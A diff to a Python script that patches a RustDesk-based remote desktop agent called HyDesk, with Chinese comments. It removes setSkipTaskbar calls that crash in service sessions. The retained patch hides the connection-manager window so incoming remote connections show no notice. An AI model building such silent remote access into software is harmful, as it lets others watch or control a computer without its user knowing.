@@ -144,12 +144,13 @@ def patch_cm_hide(root):
             raise SystemExit('patch failed: cm hide anchor not found in main.dart')
         new = ("  // 【HyDesk】agent 隐身：连接管理器窗口永不显示（连接无任何提示）。\n"
                "  // 上游 hide_cm 配置的设置入口已被注释，恒为 false，这里直接强制。\n"
-               "  // 另：CM 窗口也永不进任务栏（被连接时任务栏不出现任何按钮）。\n"
+               "  // 注意：绝不能再调 windowManager.setSkipTaskbar —— 它内部走\n"
+               "  // ITaskbarList COM（CoCreateInstance），在服务拉起的会话里可能失败，\n"
+               "  // 插件不判空就调 vtable，直接 0xc0000005 崩溃（window_manager_plugin.dll），\n"
+               "  // 表现就是「连接被对方关闭」+ 客户端每 8 秒重连一次的死循环。\n"
+               "  // 窗口只要 hide() 掉就不在任务栏，不需要这个调用。\n"
                "  final hide = true;\n"
-               "  gFFI.serverModel.hideCm = hide;\n"
-               "  try {\n"
-               "    await windowManager.setSkipTaskbar(true);\n"
-               "  } catch (_) {}\n")
+               "  gFFI.serverModel.hideCm = hide;\n")
         src = src.replace(anchor, new, 1)
         with open(p, 'w', encoding='utf-8', newline='\n') as f:
             f.write(src)
@@ -209,8 +210,9 @@ def patch_agent_window_first_show(root):
          兜底覆盖「MSI 静默装 / 旧安装包 / 手工双击 exe」三种场景，弹过
          就落 .hy_ui_seen，之后开机自启、服务拉起、被连接都纯后台隐藏。
 
-    弹窗时居中 + 临时置顶 20 秒（避免被浏览器/安装器窗口盖住看不到），
-    并且无条件 setSkipTaskbar(true)，窗口永远不占任务栏。
+    弹窗时居中 + 临时置顶 20 秒（避免被浏览器/安装器窗口盖住看不到）。
+    这里不要调 windowManager.setSkipTaskbar：该接口走 ITaskbarList COM，
+    插件不判空，CoCreateInstance 失败时空指针崩溃（见 patch_cm_hide 注释）。
     """
     p = os.path.join(root, 'flutter', 'lib', 'main.dart')
     src = read(p)
@@ -226,8 +228,9 @@ def patch_agent_window_first_show(root):
         raise SystemExit('patch failed: runMainApp show anchor not found')
     new = ('      // 【HyDesk】' + mark + '\n'
            '      // 触发条件：--hy-show-id 参数 / 安装器 ProgramData 标记（30 分钟）/ 本机首次运行。\n'
-           '      // 其余情况（服务拉起、开机、被连接）一律静默，窗口永不进任务栏。\n'
-           '      windowManager.setSkipTaskbar(true);\n'
+           '      // 其余情况（服务拉起、开机、被连接）一律静默。\n'
+           '      // 不调 setSkipTaskbar：窗口不 show 就天然不在任务栏，\n'
+           '      // 而该接口在服务会话里会因 ITaskbarList COM 失败而崩溃。\n'
            '      var hyShowOnce = false;\n'
            '      String hyBase = \'C:\\\\ProgramData\';\n'
            '      try {\n'
